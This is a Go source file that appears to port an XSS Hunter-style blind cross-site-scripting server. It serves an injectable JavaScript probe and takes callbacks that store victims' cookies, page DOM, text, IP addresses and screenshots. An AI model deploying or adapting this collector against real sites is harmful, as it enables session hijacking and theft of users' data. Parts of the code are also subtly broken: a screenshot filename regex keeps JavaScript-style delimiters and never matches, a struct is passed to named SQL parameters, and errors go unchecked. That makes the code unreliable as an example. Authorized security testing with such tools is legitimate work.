package main

import (
	"compress/gzip"
	"fmt"
	"image"
	"image/jpeg"
	"os"
	"regexp"
	"strconv"

	"net/http"

	"github.com/google/uuid"
)

func main() {
	fmt.Println("Initializing Database...")
	initialize_database()
	fmt.Println("Database Initialized")

	http.HandleFunc("/", probeHandler)
	http.HandleFunc("/js_callback", jscallbackHandler)
	http.HandleFunc("/health", healthHandler)
	http.HandleFunc("/screenshots/", screenshotHandler)

	CONTROL_PANEL_ENABLED := get_env("CONTROL_PANEL_ENABLED")
	if CONTROL_PANEL_ENABLED == "show" || CONTROL_PANEL_ENABLED == "true" {
		// http.HandleFunc("/admin", adminHandler)
		http.HandleFunc(API_BASE_PATH+"/auth-check", authCheckHandler)
		http.HandleFunc(API_BASE_PATH+"/settings", settingsHandler)
		http.HandleFunc(API_BASE_PATH+"/login/", loginHandler)
		http.HandleFunc(API_BASE_PATH+"/payloadfires", payloadFiresHandler)
		http.HandleFunc(API_BASE_PATH+"/collected_pages", collectedPagesHandler)
		http.HandleFunc(API_BASE_PATH+"/record_injection", recordInjectionHandler)
	}

	fmt.Println("Server is starting on port 8080...")
	if err := http.ListenAndServe(":8080", nil); err != nil {
		fmt.Println("Error starting server:", err)
	}
}

func set_secure_headers(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("X-XSS-Protection", "mode=block")
	w.Header().Set("X-Content-Type-Options", "nosniff")
	w.Header().Set("X-Frame-Options", "DENY")

	if r.URL.Path[:4] == "/api" {
		w.Header().Set("Content-Security-Policy", "default-src 'none'; script-src 'none'")
		w.Header().Set("Content-Type", "application/json")
	}
}

func set_payload_headers(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Security-Policy", "default-src 'none'; script-src 'none'")
	w.Header().Set("Content-Type", "application/javascript")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "GET, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type, X-Requested-With")
	w.Header().Set("Access-Control-Max-Age", "86400")
}

func set_callback_headers(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type, X-Requested-With")
	w.Header().Set("Access-Control-Max-Age", "86400")
}

type JSCallbackSchema struct {
	URI          string `json:"uri"`
	Cookies      string `json:"cookies"`
	Referrer     string `json:"referrer"`
	UserAgent    string `json:"user-agent"`
	BrowserTime  string `json:"browser-time"`
	ProbeUID     string `json:"probe-uid"`
	Origin       string `json:"origin"`
	InjectionKey string `json:"injection_key"`
	Title        string `json:"title"`
	Text         string `json:"text"`
	WasIframe    string `json:"was_iframe"`
	DOM          string `json:"dom"`
}

func jscallbackHandler(w http.ResponseWriter, r *http.Request) {
	set_callback_headers(w, r)
	// response := map[string]string{"status": "success"}
	// w.Header().Set("Content-Type", "application/json")
	// json.NewEncoder(w).Encode(response)

	// Send the response immediately, they don't need to wait for us to store everything.
	w.Write([]byte("OK"))

	payload_fire_image_id := uuid.New().String()
	payload_fire_image_filename := get_env("SCREENSHOT_DIRECTORY") + "/" + payload_fire_image_id + ".png.gz"

	img, _, err := image.Decode(r.Body)
	if err != nil {
		// http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	// Create the output file
	out, err := os.Create(payload_fire_image_filename)
	if err != nil {
		// http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	defer out.Close()

	// Create a gzip writer
	gw := gzip.NewWriter(out)
	defer gw.Close()

	// Write the image data to the gzip writer
	err = jpeg.Encode(gw, img, nil)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	/*
			const payload_fire_id = uuid.v4();
				var payload_fire_data = {
					id: payload_fire_id,
					url: req.body.uri,
					ip_address: req.connection.remoteAddress.toString(),
					referer: req.body.referrer,
					user_agent: req.body['user-agent'],
					cookies: req.body.cookies,
					title: req.body.title,
					dom: req.body.dom,
					text: req.body.text,
					origin: req.body.origin,
					screenshot_id: payload_fire_image_id,
					was_iframe: (req.body.was_iframe === 'true'),
					browser_timestamp: parseInt(req.body['browser-time']),
		            correlated_request: 'No correlated request found for this injection.',
				}
	*/
	payload_fire_id := uuid.New().String()
	browser_time, err := strconv.ParseUint(r.FormValue("browser-time"), 10, 64)
	payload_fire_data := PayloadFireResults{
		ID:                 payload_fire_id,
		url:                r.FormValue("uri"),
		ip_address:         r.RemoteAddr,
		referer:            r.FormValue("referrer"),
		user_agent:         r.FormValue("user-agent"),
		cookies:            r.FormValue("cookies"),
		title:              r.FormValue("title"),
		dom:                r.FormValue("dom"),
		text:               r.FormValue("text"),
		origin:             r.FormValue("origin"),
		screenshot_id:      payload_fire_image_id,
		was_iframe:         r.FormValue("was_iframe") == "true",
		browser_timestamp:  uint(browser_time),
		correlated_request: "No correlated request found for this injection.",
	}

	db := establish_database_connection()

	var correlated_request_rec string
	db.QueryRow("SELECT request FROM injection_requests WHERE injection_key = ?", r.FormValue("injection_key")).Scan(&correlated_request_rec)
	if correlated_request_rec != "" {
		payload_fire_data.correlated_request = correlated_request_rec
	}

	// Insert the payload_fire_data into the database
	_, err = db.Exec(`INSERT INTO payload_fire_results (id, url, ip_address, referer, user_agent, cookies, title, dom, text, origin, screenshot_id, was_iframe, browser_timestamp) 
	VALUES (:id, :url, :ip_address, :referer, :user_agent, :cookies, :title, :dom, :text, :origin, :screenshot_id, :was_iframe, :browser_timestamp)`, payload_fire_data)

	send_notification()
}

func probeHandler(w http.ResponseWriter, r *http.Request) {
	set_payload_headers(w, r)

	college_pages := get_pages_to_collect()
	chainload_uri := get_chainload_uri()
	probe_id := r.URL.Path[1:]

	probe, err := os.ReadFile("./probe.js")
	if err != nil {
		fmt.Println("Error reading file:", err)
	}

	host := get_host(r)

	re := regexp.MustCompile(`\[HOST_URL\]`)
	xss_payload_1 := re.ReplaceAllString(string(probe), host)

	re = regexp.MustCompile(`\[COLLECT_PAGE_LIST_REPLACE_ME\]`)
	xss_payload_2 := re.ReplaceAllString(xss_payload_1, college_pages)

	re = regexp.MustCompile(`\[CHAINLOAD_REPLACE_ME\]`)
	xss_payload_3 := re.ReplaceAllString(xss_payload_2, chainload_uri)

	re = regexp.MustCompile(`\[PROBE_ID\]`)
	xss_payload_4 := re.ReplaceAllString(xss_payload_3, probe_id)

	w.Write([]byte(xss_payload_4))
}

func healthHandler(w http.ResponseWriter, r *http.Request) {
	set_secure_headers(w, r)
	if establish_database_connection() != nil {
		w.Write([]byte("OK"))
	} else {
		w.WriteHeader(http.StatusInternalServerError)
	}
}

func screenshotHandler(w http.ResponseWriter, r *http.Request) {
	set_secure_headers(w, r)
	screenshotFilename := r.URL.Query().Get("screenshotFilename")

	SCREENSHOT_FILENAME_REGEX := regexp.MustCompile(`/^[0-9A-F]{8}-[0-9A-F]{4}-4[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}\.png$/i`)

	if !SCREENSHOT_FILENAME_REGEX.MatchString(screenshotFilename) {
		http.NotFound(w, r)
		return
	}

	gzImagePath := get_env("SCREENSHOT_DIRECTORY") + "/" + screenshotFilename + ".gz"

	imageExists := checkFileExists(gzImagePath)

	if !imageExists {
		http.NotFound(w, r)
		return
	}

	w.Header().Set("Content-Type", "image/png")
	w.Header().Set("Content-Encoding", "gzip")

	http.ServeFile(w, r, gzImagePath)
}
